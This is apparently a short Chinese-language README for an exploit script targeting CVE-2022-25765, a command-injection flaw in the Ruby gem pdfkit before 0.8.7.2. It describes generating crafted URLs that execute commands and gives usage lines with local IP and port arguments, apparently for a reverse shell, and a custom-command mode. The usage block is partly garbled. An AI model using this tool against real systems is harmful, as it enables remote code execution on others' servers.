## 漏洞利用说明

ruby gem`pdfkit`通常用于将网站或 HTML 转换为 PDF 文档。可以向该软件的易受攻击版本 (< 0.8.7.2) 传递一个包含将要执行的命令的特制 URL。此漏洞利用生成可执行 URL 或将它们发送到运行`pdfkit`.

## 用法

```
  python3 exploit-CVE-2022–25765.py -c <command\>
<local-IP\> <local-port\>
<command\> \[-w <http://target.com/index.html\> \-p <parameter\>
\]<local-IP\> <local-port\> \[-w <http://target.com/index.html\> \-p <parameter\>
\]
```

## 选项

```





  -c    Custom command mode. Provide command to generate custom payload with.
```
